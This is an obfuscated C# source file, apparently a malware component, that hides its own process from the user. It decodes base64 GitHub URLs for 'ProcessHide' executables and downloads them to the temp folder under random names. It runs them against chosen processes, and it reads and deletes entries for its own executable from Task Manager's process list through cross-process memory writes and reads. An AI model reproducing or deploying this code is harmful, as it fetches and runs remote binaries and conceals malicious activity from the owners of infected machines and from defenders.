using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ALzLGBAFaCqNDAE;

internal class VIqeDgTaFytwA
{
	private struct CRzPsJZEHBJ
	{
		public uint BZEbJmzEYBe;

		public IntPtr YWrnGlSeJtr;

		public IntPtr sIgypKRYRhc;

		public uint JRiNlIHXtksBD;

		public uint QGlHmwlcJSBi;

		public IntPtr rNUGthMyTm;

		public uint MHuqJevkCUMG;

		public int KYlOgVQQRUwwiWJS;

		public IntPtr WNERcaPzmqLgJPH;
	}

	private const int SHxkxSYwVv = 8;

	private const int sZoakAHysIi = 16;

	private const int gDOJjURCMv = 32;

	private const int wJCSGnboPJqL = 0;

	private const int EjISsSpMsMc = 4096;

	private const int DjYDdWLOfMkQGcKqv = 8192;

	private const int jaEUgzScxChJH = 16384;

	private const int JIVJHOSNKPdyQk = 32768;

	private const int QhWyeYsAMgtc = 65536;

	private const int SfyakIwCYN = 131072;

	private const int qcWrCNNcYqkl = 262144;

	private const int BzmbIYyrYDa = 1048576;

	private const int mMBbvRlnjuuMzgnz = 1;

	private const int UvxzRmqvMi = 2;

	private const int devxOMIJVwiIB = 4;

	private const int KnsapqmbkyMy = 8;

	private const int yReWFiUxkIMDI = 16;

	private const int LfmAPAJZvDFCqo = 32;

	private const int YeTtlGIJnbJxT = 64;

	private const int tafEGcGaIGM = 128;

	private const int WADniWXISI = 256;

	private const int eOUFJoUzKGWL = 512;

	private const int hMekwrewafwn = 4096;

	private const int XLbSWkmyCamPT = 4100;

	private const int YFbnAjPUJVR = 4104;

	private const int ufnUiKWheTkqBfeY = 4141;

	private const int jkDeznsDKAFWD = 4142;

	private const int LeQPuOqjcOFl = 4124;

	private static volatile bool CPynxjPzXRRvd = false;

	public static volatile bool rKcStthTzITaZe = true;

	public static string ovghbPGbjbsV()
	{
		if (IntPtr.Size == 8)
		{
			RMvUnHFCuFhAD.LmBUrvDrrTdzdQ = TiKPuVhmhT(new Uri(RMvUnHFCuFhAD.tRvIdsqgaYol("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			RMvUnHFCuFhAD.LmBUrvDrrTdzdQ = TiKPuVhmhT(new Uri(RMvUnHFCuFhAD.tRvIdsqgaYol("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return RMvUnHFCuFhAD.LmBUrvDrrTdzdQ;
	}

	public static string TiKPuVhmhT(Uri jUAdeoVcMdoti)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(jUAdeoVcMdoti, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process NClBmCxsyej(string hkDsiXuiovU)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(hkDsiXuiovU))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void LVNtphQMYcbo(string[] NZXmIEtkqzQH)
	{
		string text = ovghbPGbjbsV();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string hkDsiXuiovU in NZXmIEtkqzQH)
			{
				Process process = NClBmCxsyej(hkDsiXuiovU);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					RMvUnHFCuFhAD.wRzEVCtsszv(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					RMvUnHFCuFhAD.wRzEVCtsszv(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int bHniUQCoNsLce, bool glTYWTPWsWfgqEA, uint aEBFuqRzKylIXV);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr aRmMxFSifFIZ, IntPtr VSrtqLuErPLFpJvF, uint KTmpSBVXLWbbpg, int TlsAGTyFfOWs, int CttejQrLfwAjMIuqu);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr GVwubzTxcWvD, IntPtr cmLFsQtjDLJ, uint yLwBvOCSlsPMw, int AXNzIRNlaPf);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr YhgkwRIOxI);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr udSLFHZczbpkiAs, IntPtr QyKmgrQcgBGQoKt, byte[] csifwXWIwmKp, uint QBpDOIrzueQIYJZ, out UIntPtr nncpXabWvck);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr tznJVtZnwOJliF, IntPtr ncVWOcLbgRcpdA, [Out] byte[] kqlooIBQgusL, int RJhqpKiGZXOlsST, out UIntPtr VZPDSXwKnUDf);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr BDEPaEaBGZdaFd, out uint oQaHCxKiNkoiQdf);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr DfZnDPPtYknY, uint mPItmHioAAE, IntPtr HeUtYdgrnyGGB, IntPtr GXsIdxuhIGCX);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string NmupjCfQlwq, string oYHMcRuxwiptdMg);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr OfWORaejzSyrY, IntPtr OQxSwCRgBsYDr, string AgJniAbzktKo, string xZWPEfxTHPuY);

	private static byte[] cMCTvHLEYhWze(object nKHZMiiYOQE)
	{
		int num = Marshal.SizeOf(nKHZMiiYOQE);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(nKHZMiiYOQE, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr QhSiMpgGBnjg(uint CAEiIHWIaFEkGM)
	{
		return OpenProcess(56, glTYWTPWsWfgqEA: false, CAEiIHWIaFEkGM);
	}

	private static void CROnFHHgmJA(IntPtr QXIBtAfzlxAVP)
	{
		CloseHandle(QXIBtAfzlxAVP);
	}

	private static IntPtr hoXDVsIvVC(uint unjUfXXXLVpy, IntPtr DfMFpEYuQYsoH)
	{
		return VirtualAllocEx(DfMFpEYuQYsoH, IntPtr.Zero, unjUfXXXLVpy, 12288, 4);
	}

	private static void MEbgwhQRnsscFH(IntPtr nbzEmlqFxaepK, IntPtr tVETUzltfVPnxnH, uint rRFipElNIPSLvEBItj)
	{
		VirtualFreeEx(nbzEmlqFxaepK, tVETUzltfVPnxnH, rRFipElNIPSLvEBItj, 32768);
	}

	private static IntPtr RvwFmlDNUir()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr qLHrArIHpzh(IntPtr sObpSBEskShFLbkt)
	{
		return SendMessage(sObpSBEskShFLbkt, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void nPiEDEJWiQEE(IntPtr GzebYWJJujU, IntPtr VaTgtHMjjHpxLc)
	{
		SendMessage(GzebYWJJujU, 4104u, VaTgtHMjjHpxLc, IntPtr.Zero);
	}

	private static void dAwaxcxNJMX(IntPtr KcUHrvAUSJdZEh)
	{
		SendMessage(KcUHrvAUSJdZEh, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string ckFVQNMnTCLA(IntPtr ZVxYMgUdkEjwJo, IntPtr wXixMzKALjnr)
	{
		byte[] array = new byte[50];
		CRzPsJZEHBJ cRzPsJZEHBJ = default(CRzPsJZEHBJ);
		GetWindowThreadProcessId(ZVxYMgUdkEjwJo, out var oQaHCxKiNkoiQdf);
		IntPtr intPtr = QhSiMpgGBnjg(oQaHCxKiNkoiQdf);
		IntPtr intPtr2 = hoXDVsIvVC((uint)Marshal.SizeOf(cRzPsJZEHBJ), intPtr);
		IntPtr intPtr3 = hoXDVsIvVC(50u, intPtr);
		cRzPsJZEHBJ.YWrnGlSeJtr = wXixMzKALjnr;
		cRzPsJZEHBJ.sIgypKRYRhc = (IntPtr)0;
		cRzPsJZEHBJ.MHuqJevkCUMG = 50u;
		cRzPsJZEHBJ.rNUGthMyTm = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, cMCTvHLEYhWze(cRzPsJZEHBJ), (uint)Marshal.SizeOf(cRzPsJZEHBJ), out var nncpXabWvck);
		SendMessage(ZVxYMgUdkEjwJo, 4141u, wXixMzKALjnr, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out nncpXabWvck);
		MEbgwhQRnsscFH(intPtr, intPtr2, (uint)Marshal.SizeOf(cRzPsJZEHBJ));
		MEbgwhQRnsscFH(intPtr, intPtr3, 50u);
		CROnFHHgmJA(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void FbJwCQKeSrmfawP(string refbSiqJnKoqg)
	{
		IntPtr intPtr = RvwFmlDNUir();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)qLHrArIHpzh(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = ckFVQNMnTCLA(intPtr, (IntPtr)i);
			if (text.Contains(refbSiqJnKoqg))
			{
				nPiEDEJWiQEE(intPtr, (IntPtr)i);
			}
		}
	}

	private static void kzWnOyXaJEuBYY()
	{
		IntPtr intPtr = RvwFmlDNUir();
		if (intPtr != IntPtr.Zero)
		{
			dAwaxcxNJMX(intPtr);
			dAwaxcxNJMX(intPtr);
			dAwaxcxNJMX(intPtr);
			dAwaxcxNJMX(intPtr);
			dAwaxcxNJMX(intPtr);
		}
	}

	public static void StKhoxFsnmI()
	{
		Thread thread = new Thread(zDuuvCGoQCvalZ);
		thread.Start();
	}

	public static void DMCRClmXiwD()
	{
		CPynxjPzXRRvd = true;
	}

	private static void zDuuvCGoQCvalZ()
	{
		while (!CPynxjPzXRRvd)
		{
			if (rKcStthTzITaZe)
			{
				FbJwCQKeSrmfawP(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				kzWnOyXaJEuBYY();
				Thread.Sleep(1000);
			}
		}
		CPynxjPzXRRvd = false;
	}
}
